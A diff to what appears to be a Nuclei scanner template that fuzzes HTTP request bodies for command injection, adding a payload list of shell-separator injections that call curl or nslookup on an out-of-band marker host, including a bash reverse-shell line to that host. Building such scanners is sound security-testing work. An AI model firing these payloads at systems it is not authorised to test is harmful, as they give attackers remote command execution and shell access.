@@ -23,17 +23,26 @@ http:
           - 'method == "PATCH"'
           - 'method == "DELETE"'
 
-    stop-at-first-match: true
     payloads:
-      interaction:
+      rce:
         - "|nslookup {{marker}}|curl {{marker}}"
+        - "||nslookup {{marker}}|curl {{marker}}"
+        - "&& nslookup {{marker}}|curl {{marker}} &&"
+        - "; nslookup {{marker}}|curl {{marker}} ;"
+        - "$(curl http://{{marker}})"
+        - "`curl http://{{marker}}`"
+        - "; bash -c 'curl http://{{marker}}' ;"
+        - "; bash -c 'nslookup {{marker}}' ;"
+        - "; bash -i >& /dev/tcp/{{marker}}/443 0>&1 ;"
         
     fuzzing:
       - part: body
+        type: postfix
         mode: single
         fuzz:
-          - "{{interaction}}"
-
+          - "{{rce}}"
+          
+    stop-at-first-match: true
     matchers:
       - type: word
         part: interactsh_protocol
